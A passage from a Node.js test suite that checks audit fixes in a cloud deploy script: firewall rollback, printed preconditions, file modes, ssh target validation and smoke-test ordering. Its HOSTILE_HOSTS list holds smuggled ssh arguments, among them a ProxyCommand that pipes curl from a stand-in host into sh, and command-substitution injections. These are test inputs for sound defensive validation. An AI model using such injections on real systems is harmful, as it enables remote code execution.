    rmSync(dir, { recursive: true, force: true });
  }
});

test('N-4: the rollback trap covers a firewall that never returned its id', () => {
  const dir = tmpdir('trap');
  try {
    const stubs = path.join(dir, 'stubs');
    mkdirSync(stubs);
    const stub = (name, body) => {
      const file = path.join(stubs, name);
      writeFileSync(file, `#!/usr/bin/env bash\n${body}\n`, 'utf8');
      chmodSync(file, 0o755);
    };
    // The exact shape of the finding: do_api.py records the id and then exits non-zero, so
    // `WREN_FIREWALL_ID="$(create_firewall)"` never assigns anything.
    stub('check_image_slug', 'exit 0');
    stub('check_no_existing_firewall', 'exit 0');
    stub(
      'create_firewall',
      'printf "fw-orphan\\n" > "$WREN_FIREWALL_ID_FILE"; echo "readback mismatch" >&2; exit 1',
    );
    stub('delete_firewall', 'touch "$WREN_TEST_DIR/deleted-$1"');
    stub('destroy_droplet', 'touch "$WREN_TEST_DIR/destroyed-$1"');

    const token = tokenFile(dir);
    const sshKey = path.join(dir, 'id_ed25519.pub');
    writeFileSync(sshKey, 'ssh-ed25519 AAAAfaketest fake\n', 'utf8');

    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], {
      encoding: 'utf8',
      env: {
        ...process.env,
        WREN_DEPLOY_CONFIRMED: '1',
        WREN_NO_NETWORK: '1',
        WREN_STUB_DIR: stubs,
        WREN_TEST_DIR: dir,
        WREN_RUN_RECORD_DIR: path.join(dir, 'records'),
        WREN_DESK_IP: '203.0.113.4',
        DO_TOKEN_FILE: token,
        SSH_PUBLIC_KEY_FILE: sshKey,
      },
    });
    assert.notEqual(result.status, 0, 'a failed firewall readback must fail the deploy');
    assert.ok(
      existsSync(path.join(dir, 'deleted-fw-orphan')),
      `the orphaned firewall was NOT deleted. stderr: ${result.stderr}`,
    );
    assert.match(result.stderr, /recovered fw-orphan from the id file/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('N-4: --create refuses at precondition time if a firewall already targets wren-v2', async () => {
  const dir = tmpdir('fwnone');
  const server = await doServer((method, url) => {
    if (method === 'GET' && url === '/v2/firewalls') {
      return { body: { firewalls: [{ id: 'fw-old', name: 'leftover-fw', tags: ['wren-v2'] }] } };
    }
    return { status: 404, body: {} };
  });
  try {
    const result = await runApi(['firewall-none', tokenFile(dir), 'wren-v2'], server.base);
    assert.equal(result.status, 1, 'a leftover firewall on the tag must refuse the create');
    assert.match(result.stderr, /already target tag wren-v2/);
    assert.match(result.stderr, /fw-old/);
  } finally {
    await server.close();
    rmSync(dir, { recursive: true, force: true });
  }
  assert.match(deployText(), /"check_no_existing_firewall\|/, 'the check must be a precondition, not an afterthought');
});

test('N-4: do_api.py refuses an api base that is neither DigitalOcean nor loopback', async () => {
  const dir = tmpdir('apibase');
  try {
    const result = await runApi(['firewall-none', tokenFile(dir), 'wren-v2'], 'https://evil.example.invalid');
    assert.equal(result.status, 2);
    assert.match(result.stderr, /may only be https:\/\/api\.digitalocean\.com or a loopback address/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// N-5 (low-medium). --plan named a control that did not exist.
// ---------------------------------------------------------------------------

/** The precondition rows as the script declares them: [function, the sentence --plan prints]. */
function declaredPreconditions() {
  const text = deployText();
  const open = text.indexOf('CREATE_PRECONDITIONS=(');
  const block = text.slice(open, text.indexOf('\n)\n', open));
  // The rows are bash double-quoted strings, so a backtick in one is written \` in the file and
  // arrives as ` at runtime. Compare what the shell produces, not what the source spells.
  return [...block.matchAll(/^\s*"([a-z_]+)\|(.+)"$/gm)].map((m) => [m[1], m[2].replace(/\\(.)/g, '$1')]);
}

/** The numbered list --plan actually prints to the Master. */
function printedPreconditions(text) {
  const start = text.indexOf('== What --create does ==');
  const end = text.indexOf('Then, and only then:', start);
  assert.ok(start >= 0 && end > start, '--plan must print a precondition list');
  return [...text.slice(start, end).matchAll(/^\s+(\d+)\. (.+)$/gm)].map((m) => [Number(m[1]), m[2]]);
}

test("N-5: --plan's numbered preconditions ARE cmd_create's loop, row for row", () => {
  const declared = declaredPreconditions();
  const printed = printedPreconditions(plan());
  assert.ok(declared.length >= 9, `the array must be parseable, found ${declared.length} rows`);
  assert.equal(
    printed.length,
    declared.length,
    '--plan prints a different number of preconditions than the script runs',
  );
  declared.forEach(([, sentence], index) => {
    assert.equal(printed[index][0], index + 1, 'the printed list must be numbered in order');
    assert.equal(printed[index][1], sentence, `row ${index + 1} differs between the array and --plan`);
  });
});

test('N-5: every precondition named in the array is a function, and every check_ function is in the array', () => {
  const text = deployText();
  const declared = declaredPreconditions().map(([fn]) => fn);
  const defined = [...text.matchAll(/^(check_[a-z_]+)\(\) \{$/gm)].map((m) => m[1]);
  for (const fn of declared) {
    assert.ok(defined.includes(fn), `${fn} is named in CREATE_PRECONDITIONS and is not defined`);
  }
  for (const fn of defined) {
    assert.ok(declared.includes(fn), `${fn} is defined and is not in CREATE_PRECONDITIONS -- an unrun check`);
  }
  assert.ok(declared.includes('check_image_slug'), "the image-slug precondition --plan claimed must exist");
});

test('N-5: the image-slug precondition really reads the account, and refuses a slug it does not list', async () => {
  const dir = tmpdir('imageslug');
  const server = await doServer((method, url) => {
    if (method === 'GET' && url.startsWith('/v2/images')) {
      return { body: { images: [{ slug: 'debian-12-x64' }, { slug: 'ubuntu-24-04-x64' }], links: {} } };
    }
    return { status: 404, body: {} };
  });
  try {
    const token = tokenFile(dir);
    const missing = await runApi(['image-slug', token, 'debian-13-x64'], server.base);
    assert.equal(missing.status, 1, 'a slug the account does not list must be refused');
    assert.match(missing.stderr, /is not listed in this account's own/);

    const present = await runApi(['image-slug', token, 'debian-12-x64'], server.base);
    assert.equal(present.status, 0, `a listed slug must pass: ${present.stderr}`);
  } finally {
    await server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('N-5: --plan names exactly the files post-boot-assert.sh asserts, and no longer claims "every path above"', () => {
  const text = plan();
  const postBoot = readFileSync(POST_BOOT, 'utf8');
  const open = postBoot.indexOf('EXPECTED_FILES = [');
  const block = postBoot.slice(open, postBoot.indexOf(']', open));
  const files = [...block.matchAll(/f"\{(srv|sshd_conf_d)\}([^"]*)"/g)].map(
    (m) => (m[1] === 'srv' ? '/srv/wren' : '/etc/ssh/sshd_config.d') + m[2],
  );
  assert.equal(files.length, 3, `EXPECTED_FILES must be parseable, found ${JSON.stringify(files)}`);
  for (const file of files) {
    assert.ok(text.includes(file), `--plan's step E does not name ${file}, which the post-boot file asserts`);
  }
  assert.doesNotMatch(text, /The same file asserts every path above/, 'the claim that was wider than the truth');
  assert.match(text, /It asserts no other file's mode/);
});

// ---------------------------------------------------------------------------
// N-6 (low). /srv/wren/chain.json was created by nothing.
// ---------------------------------------------------------------------------

test('N-6: cloud-init creates chain.json at the owner and mode the signer needs', () => {
  const yaml = readFileSync(CLOUD_INIT_FILE, 'utf8');
  assert.match(
    yaml,
    /- \[ install, -m, "0600", -o, purse, -g, purse, \/dev\/null, \/srv\/wren\/chain\.json \]/,
    'chain.json is created by nothing; the signer refuses to start and the beat never runs',
  );
});

test('N-6: --plan prints chain.json, and the post-boot check asserts its mode', () => {
  assert.match(plan(), /\/srv\/wren\/chain\.json\s+0600 purse:purse/);
  assert.match(readFileSync(POST_BOOT, 'utf8'), /\(f"\{srv\}\/chain\.json",\s+0o600, "purse", "purse"\)/);
});

test('N-6: the path cloud-init creates is the path wren-purse.service names', () => {
  const unit = readFileSync(path.join(PURSE_SYSTEMD_DIR, 'wren-purse.service'), 'utf8');
  const chain = /--chain (\S+)/.exec(unit);
  assert.ok(chain, 'the purse unit must name a chain file');
  assert.equal(chain[1], '/srv/wren/chain.json');
  assert.match(readFileSync(CLOUD_INIT_FILE, 'utf8'), new RegExp(chain[1].replace(/[/.]/g, '\\$&')));
});

// ---------------------------------------------------------------------------
// N-7 (low). WREN_HOST was not validated.
// ---------------------------------------------------------------------------

const HOSTILE_HOSTS = [
  '-oProxyCommand=curl http://evil.invalid|sh',
  '-F/dev/null',
  'ops@203.0.113.9 -oProxyCommand=x',
  'ops@203.0.113.9;id',
  'OPS@203.0.113.9',
  'ops@203.0.113.9$(id)',
];

test('N-7: --seal refuses a WREN_HOST ssh would read as an option, or that is not [user@]host', () => {
  for (const host of HOSTILE_HOSTS) {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--seal', 'mail-key', '--dry-run'], {
      encoding: 'utf8',
      env: { ...process.env, WREN_HOST: host },
    });
    assert.notEqual(result.status, 0, `--seal accepted WREN_HOST="${host}"`);
    assert.match(result.stderr, /WREN_HOST is/);
  }
});

test('N-7: --smoke and --status refuse the same values, before they reach ssh', () => {
  for (const mode of ['--smoke', '--status']) {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, mode], {
      encoding: 'utf8',
      env: { ...process.env, WREN_HOST: '-oProxyCommand=id' },
    });
    assert.notEqual(result.status, 0, `${mode} accepted a hostile WREN_HOST`);
    assert.match(result.stderr, /begins with '-'/);
  }
});

test('N-7: a legitimate ops@<ip> is accepted, and every ssh/scp passes its target after --', () => {
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--seal', 'mail-key', '--dry-run'], {
    encoding: 'utf8',
    env: { ...process.env, WREN_HOST: 'ops@203.0.113.9' },
  });
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /\| ssh -- ops@203\.0\.113\.9 /, 'the target must be passed after --');
  for (const line of deployText().split('\n')) {
    const trimmed = line.trim();
    const invocation = /(?:^|\|\s*|until\s+)(?:ssh|scp)\s+(.*)$/.exec(trimmed);
    // --plan's own prose contains the words "ssh key:"; what this is about is an invocation that
    // carries a TARGET, which on this host is always ops@... or $ssh_target.
    if (!invocation || !/ops@|\$ssh_target/.test(invocation[1])) continue;
    assert.match(trimmed, /(^|\s)-- /, `an ssh/scp invocation with no -- separator: ${trimmed}`);
  }
});

// ---------------------------------------------------------------------------
// Section 3's four requirements.
// ---------------------------------------------------------------------------

test('section 3: the alert unit gets AF_UNIX and AF_NETLINK, with the reason in the unit', () => {
  const svc = readFileSync(path.join(DO_DIR, 'systemd', 'wren-alert@.service'), 'utf8');
  assert.match(svc, /^RestrictAddressFamilies=AF_UNIX AF_NETLINK AF_INET AF_INET6$/m);
  assert.match(svc, /varlink/i, 'the AF_UNIX reason -- nss-resolve talks to systemd-resolved over a unix socket');
  assert.match(svc, /AI_ADDRCONFIG/, 'the AF_NETLINK reason -- glibc probes the kernel for configured families');
});

test('section 3: cloud-init pins hosts: files dns, and the post-boot check asserts that exact line', () => {
  const yaml = readFileSync(CLOUD_INIT_FILE, 'utf8');
  assert.match(yaml, /hosts:\s+files dns/, 'the resolver path must be pinned, not inherited');
  assert.match(
    yaml,
    /grep -qE '\^hosts:\[\[:space:\]\]\+files dns\$' \/etc\/nsswitch\.conf/,
    'cloud-init must read it back',
  );
  assert.match(
    readFileSync(POST_BOOT, 'utf8'),
    /hosts:\[\[:space:\]\]\+files dns/,
    'the post-boot check must assert it',
  );
});

test('section 3: the post-boot check proves /usr/bin/node exists and prints its version', () => {
  const text = readFileSync(POST_BOOT, 'utf8');
  assert.match(text, /NODE_BIN="\$\{WREN_NODE_BIN:-\/usr\/bin\/node\}"/);
  assert.match(text, /\[ -x "\$NODE_BIN" \] \|\| fail/);
  assert.match(text, /"\$NODE_BIN" --version/);
});

// ---------------------------------------------------------------------------
// --smoke: the mail drill is a hard gate BEFORE the beat timer is enabled.
// ---------------------------------------------------------------------------

function smokeStubs({ failAt } = {}) {
  const dir = tmpdir('smoke');
  const stubs = path.join(dir, 'stubs');
  mkdirSync(stubs);
  const orderFile = path.join(dir, 'order');
  writeFileSync(orderFile, '', 'utf8');
  const stub = (name, body) => {
    const file = path.join(stubs, name);
    writeFileSync(file, `#!/usr/bin/env bash\nprintf '%s\\n' "${name}" >> "$WREN_TEST_ORDER"\n${body}\n`, 'utf8');
    chmodSync(file, 0o755);
  };
  for (const name of [
    'smoke_assert_host',
    'smoke_firewall_effective',
    'smoke_mail_gate',
    'smoke_beat',
    'smoke_enable_timers',
  ]) {
    stub(name, failAt === name ? 'echo "smoke: refused - simulated" >&2; exit 1' : 'exit 0');
  }
  return {
    dir,
    orderFile,
    env: {
      ...process.env,
      WREN_NO_NETWORK: '1',
      WREN_STUB_DIR: stubs,
      WREN_TEST_ORDER: orderFile,
      WREN_HOST: 'ops@203.0.113.9',
      DO_TOKEN_FILE: tokenFile(dir),
    },
    order: () => readFileSync(orderFile, 'utf8').split('\n').filter(Boolean),
  };
}

test('--smoke: a failed mail drill enables NOTHING -- not the beat timer, not any other', () => {
  const f = smokeStubs({ failAt: 'smoke_mail_gate' });
  try {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--smoke'], { encoding: 'utf8', env: f.env });
    assert.notEqual(result.status, 0, 'a failed mail drill must fail --smoke');
    const order = f.order();
    assert.ok(order.includes('smoke_mail_gate'), 'the drill must have run');
    assert.ok(!order.includes('smoke_beat'), 'nothing may proceed past a failed mail drill');
    assert.ok(!order.includes('smoke_enable_timers'), 'NO TIMER may be enabled after a failed mail drill');
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('--smoke: the drill comes BEFORE the timers, and the account is read before the drill', () => {
  const f = smokeStubs();
  try {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--smoke'], { encoding: 'utf8', env: f.env });
    assert.equal(result.status, 0, `the stubbed smoke path failed: ${result.stderr}`);
    assert.deepEqual(f.order(), [
      'smoke_assert_host',
      'smoke_firewall_effective',
      'smoke_mail_gate',
      'smoke_beat',
      'smoke_enable_timers',
    ]);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('--smoke: the mail gate refuses on a host with no sealed mail-key, and says no timer was enabled', () => {
  const text = deployText();
  const gate = text.slice(text.indexOf('smoke_mail_gate() {'), text.indexOf('smoke_beat() {'));
  assert.match(gate, /\[ ! -f \/etc\/wren\/creds\/mail-key\.cred \]/, 'the sealed credential must be the first condition');
  assert.match(gate, /systemctl start wren-alert@smoke\.service/, 'a real send, through the real unit');
  assert.match(gate, /wren-alert: sent instance=smoke id=/, 'a message id in the journal, not merely exit 0');
  assert.match(gate, /NO TIMER IS ENABLED/);
});

test('--smoke: wren-alert knows the smoke instance, so the drill arrives worded as a drill', () => {
  const result = alertDryRun('smoke');
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /subject: Wren smoke: the alert path works/);
  assert.match(result.stdout, /No timer was enabled until this message was accepted/);
});

// ---------------------------------------------------------------------------
// The lifted WREN_NO_NETWORK refusal in cmd_create.
// ---------------------------------------------------------------------------

test('the lift: without WREN_DEPLOY_CONFIRMED=1, --create refuses and reaches nothing', () => {
  const env = { ...process.env };
  delete env.WREN_DEPLOY_CONFIRMED;
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], { encoding: 'utf8', env });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /WREN_DEPLOY_CONFIRMED is not 1/);
  assert.doesNotMatch(result.stderr, /not exercised against a real account/, 'the unconditional refusal is lifted');
});

test('the lift: with the word but a failing precondition, --create refuses naming that precondition', () => {
  const dir = tmpdir('lift');
  try {
    const token = path.join(dir, 'do-token');
    writeFileSync(token, 'not-a-real-token\n', 'utf8');
    chmodSync(token, 0o644); // the one thing check_do_token_file refuses
    const sshKey = path.join(dir, 'id_ed25519.pub');
    writeFileSync(sshKey, 'ssh-ed25519 AAAAfaketest fake\n', 'utf8');
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], {
      encoding: 'utf8',
      env: {
        ...process.env,
        WREN_DEPLOY_CONFIRMED: '1',
        WREN_NO_NETWORK: '1',
        WREN_DESK_IP: '203.0.113.4',
        DO_TOKEN_FILE: token,
        SSH_PUBLIC_KEY_FILE: sshKey,
      },
    });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /is mode 644, not 0600/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('the lift: cmd_create no longer carries the unconditional WREN_NO_NETWORK refusal', () => {
  const text = deployText();
  const create = text.slice(text.indexOf('cmd_create() {'), text.indexOf('create_sequence() {'));
  assert.doesNotMatch(
    create,
    /if \[ "\$\{WREN_NO_NETWORK:-\}" != "1" \]; then/,
    'the unconditional refusal that made the whole sequence unreachable must be gone',
  );
  assert.match(create, /for entry in "\$\{CREATE_PRECONDITIONS\[@\]\}"/, 'the preconditions must run from the array');
});

// ---------------------------------------------------------------------------
// Step 9's on-host assertions (section 5), as a file that runs here.
// ---------------------------------------------------------------------------

function smokeHostFixture({
  chainMode = 0o600,
  chainBody = '{"network":"mainnet"}',
  dockerFails = false,
  rootDocker = false,
} = {}) {
  const dir = tmpdir('smokehost');
  const bin = path.join(dir, 'bin');
  mkdirSync(bin);
  const write = (name, body) => {
    const file = path.join(bin, name);
    writeFileSync(file, body, 'utf8');
    chmodSync(file, 0o755);
  };
  // `sudo -u #10002 cmd` runs cmd; this laptop cannot change uid, so the stub stands in for the
  // privilege drop and what is actually asserted here is the file's own readability and content.
  write('sudo', '#!/usr/bin/env bash\nif [ "${1:-}" = "-u" ]; then shift 2; fi\nexec "$@"\n');
  write(
    'systemd-run',
    `#!/usr/bin/env bash
while [ "\${1:-}" != "\${1#--}" ]; do shift; done
if [ "\${WREN_FIXTURE_DOCKER_FAILS:-}" = "1" ]; then
  echo "Failed to connect to the docker socket" >&2
  exit 1
fi
echo "28.0.1"
exit 0
`,
  );
  write('docker', '#!/usr/bin/env bash\necho "28.0.1"\n');

  const srv = path.join(dir, 'srv-wren');
  mkdirSync(srv);
  const chain = path.join(srv, 'chain.json');
  writeFileSync(chain, chainBody, 'utf8');
  chmodSync(chain, chainMode);

  const rootHome = path.join(dir, 'root');
  mkdirSync(rootHome);
  if (rootDocker) mkdirSync(path.join(rootHome, '.docker'));

  return {
    dir,
    chain,
    env: {
      ...process.env,
      PATH: `${bin}:${process.env.PATH}`,
      WREN_SRV_ROOT: srv,
      WREN_ROOT_HOME: rootHome,
      WREN_DOCKER_BIN: path.join(bin, 'docker'),
      WREN_SYSTEMD_RUN: path.join(bin, 'systemd-run'),
      ...(dockerFails ? { WREN_FIXTURE_DOCKER_FAILS: '1' } : {}),
    },
  };
}

test('step 9: smoke-assert.sh passes on a good fixture and names the step-10 check it cannot make', () => {
  const f = smokeHostFixture();
  try {
    const result = spawnSync('bash', [SMOKE_ASSERT], { encoding: 'utf8', env: f.env });
    assert.equal(result.status, 0, `smoke-assert.sh failed: ${result.stderr}`);
    assert.match(result.stdout, /readable and parsable as uid 10002/);
    assert.match(result.stdout, /docker answered from inside ProtectSystem=strict/);
    assert.match(result.stdout, /ProtectHome=yes hides nothing the beat needs/);
    assert.match(result.stdout, /STEP 10, not asserted here - unattended-upgrades/);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('step 9: an unparsable chain.json refuses, because the signer reads it at start', () => {
  const f = smokeHostFixture({ chainBody: 'not json at all' });
  try {
    const result = spawnSync('bash', [SMOKE_ASSERT], { encoding: 'utf8', env: f.env });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /is not parsable JSON read as uid 10002/);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('step 9: a docker socket unreachable under ProtectSystem=strict refuses, naming the fallback', () => {
  const f = smokeHostFixture({ dockerFails: true });
  try {
    const result = spawnSync('bash', [SMOKE_ASSERT], { encoding: 'utf8', env: f.env });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /docker socket is NOT reachable/);
    assert.match(result.stderr, /ReadWritePaths=\/run\/docker\.sock/, 'the one-line fallback must be named');
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('step 9: a ~/.docker the beat unit could not see under ProtectHome refuses', () => {
  const f = smokeHostFixture({ rootDocker: true });
  try {
    const result = spawnSync('bash', [SMOKE_ASSERT], { encoding: 'utf8', env: f.env });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /\.docker exists, and wren-beat\.service runs as root under ProtectHome=yes/);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('step 9: --smoke reads the effective ruleset for the tag from the ACCOUNT, not from one echo', async () => {
  const dir = tmpdir('effective');
  const server = await doServer((method, url) => {
    if (method === 'GET' && url === '/v2/firewalls') {
      return {
        body: {
          firewalls: [
            {
              id: 'fw-1',
              name: 'wren-first-fw',
              tags: ['wren-v2'],
              inbound_rules: [{ protocol: 'tcp', ports: '22', sources: { addresses: ['203.0.113.4'] } }],
              outbound_rules: [],
            },
            {
              id: 'fw-2',
              name: 'somebody-elses-fw',
              tags: ['wren-v2'],
              inbound_rules: [{ protocol: 'tcp', ports: '80', sources: { addresses: ['0.0.0.0/0'] } }],
              outbound_rules: [],
            },
          ],
        },
      };
    }
    return { status: 404, body: {} };
  });
  try {
    const result = await runApi(['firewall-effective', tokenFile(dir), 'wren-v2'], server.base);
    assert.equal(result.status, 0, result.stderr);
    // The whole reason this reads the account: a SECOND firewall on the tag admits what the first
    // firewall's own echo cannot show.
    assert.match(result.stdout, /2 firewall\(s\)/);
    assert.match(result.stdout, /somebody-elses-fw/);
    assert.match(result.stdout, /inbound {2}tcp\/80/);
  } finally {
    await server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});
